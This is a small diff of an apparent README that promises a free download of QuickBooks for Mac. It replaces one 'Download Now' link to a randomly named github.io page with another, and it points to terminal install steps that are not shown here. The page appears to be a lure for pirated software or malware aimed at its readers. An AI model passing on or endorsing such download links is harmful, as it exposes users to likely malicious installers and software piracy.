@@ -2,7 +2,7 @@
 
 Easily manage your finances with QuickBooks for Mac. Follow the step-by-step instructions below to download and install this powerful accounting software for free.  
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/quickbooks)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/quickbooks)
 
 If the download button doesn’t work, follow the terminal-based installation instructions below.
 
